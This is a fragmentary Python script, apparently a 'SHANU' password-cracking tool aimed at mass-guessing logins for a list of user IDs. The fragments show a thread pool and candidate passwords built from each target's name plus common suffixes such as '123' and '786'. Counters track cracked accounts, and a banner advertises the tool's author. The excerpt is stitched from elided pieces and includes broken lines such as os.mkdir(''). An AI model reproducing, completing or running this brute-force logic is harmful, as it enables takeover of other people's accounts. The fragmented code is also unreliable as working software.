...
from concurrent.futures import ThreadPoolExecutor as SHANUabba
...
N = '\033[0m'	# WARNA MATI 
from concurrent.futures import ThreadPoolExecutor as QSHANURMahar
...
def main():
    ...
    if Adi in ('0', '00'):
        exit('THANKS FOR USING THE-SHANU TOOL')  
    else:
...
class __crack__:
	...
	def __pler__(self):
		...
		print ("\033[1;37m [3] \033[1;36mMETHOD SLOW ")
		print(50*"\033[1;97m_")
				...
				for yntkts in self.id:
					try:
						...
						if len(xz) == 1:
							...
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"112uu"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mSHANU\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
...
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +923000375621│\033[1;32m──────────────────────\033[1;32m│
...
\033[1;32m└────────────────────────────────────────────────┘
\033[1;32m│         \033[1;37m• u​​​​​ 🇹​​​​​🇴​​​​​🇴​​​​​🇱​​​​​ 🇨​​​​​🇷​​​​​🇪​​​​​🇦​​​​​🇹​​​​​🇪​​​​​🇩​​​​​ 🇧​​​​​🇾​​​​​ 🇸​🇭​🇦​🇳​🇺​ \033[1;37m•      \033[1;32m │
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
